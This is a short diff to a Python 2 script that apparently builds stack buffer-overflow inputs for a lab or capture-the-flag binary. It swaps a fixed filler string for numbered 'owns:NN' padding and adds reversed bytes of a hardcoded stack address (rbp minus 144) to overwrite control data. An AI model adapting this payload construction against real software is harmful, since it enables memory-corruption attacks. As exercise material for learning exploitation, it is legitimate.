@@ -13,11 +13,17 @@ def hexify(n):
 rbp = 0x7fffffffdb70
 bytes = hexify(rbp - 144)
 
-owns = 'ownz_u!\0' * 16
+def own(n):
+  return 'owns:%02i\0' % n
+
+def owns(a,b):
+  return ''.join(map(own,range(a,b)))
+
+# owns = 'ownz_u!\0' * 16
 
 inputs = [
 # junk: NOT the same as 3rd option because here we write null over 0x64
-  (owns
+  (owns(16,32)
    + ''.join(map(chr,reversed(bytes))))
 
 # segfault
@@ -44,4 +50,4 @@ inputs = [
 print inputs[0]
 
 # pw
-print owns
+print owns(0,16)
